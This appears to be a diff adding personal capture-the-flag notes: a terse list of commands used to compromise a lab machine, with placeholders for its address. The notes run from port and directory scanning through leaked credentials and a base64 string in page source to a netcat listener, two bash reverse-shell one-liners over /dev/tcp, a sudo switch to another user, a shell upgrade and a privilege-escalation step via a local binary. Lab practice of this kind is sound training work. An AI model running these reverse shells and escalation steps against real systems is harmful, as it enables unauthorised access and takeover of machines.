@@ -1,0 +1,19 @@
+view-source:<ip>
+username : d4rk_T1t0u4N
+nmap -vv <ip> -p-
+gobuster dir -u <ip> -w common.txt
+<ip>/robots.txt 
+password : 8ES7_SHeLL_Ev4H
+<ip>/portal.php
+wget <ip>/mandatory_flag
+view-source:<ip>/portal.php -> YUdGMlpTQjViM1VnYUdWaGNtUWdiMllnWVNCeVlXSmlhWFFnYUc5c1pTQS9JRmx2ZFNCemFHOTFiR1FnYkc5dmF5QnBkQ0IxY0N3Z2VXOTFJR3AxYzNRZ1ptVnNiQ0JwYmlCdmJtVmNJUT09
+nc -lvnp 4242
+bash -c 'sh -i >& /dev/tcp/<ip>/<port> 0>&1'
+bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'
+sudo -u titouan /bin/sh
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+cd /home/titouan/
+cat optional_flag
+/home/titouan/42sh -p
+
+si marche pas : /home/titouan/42sh -c '/bin/sh'
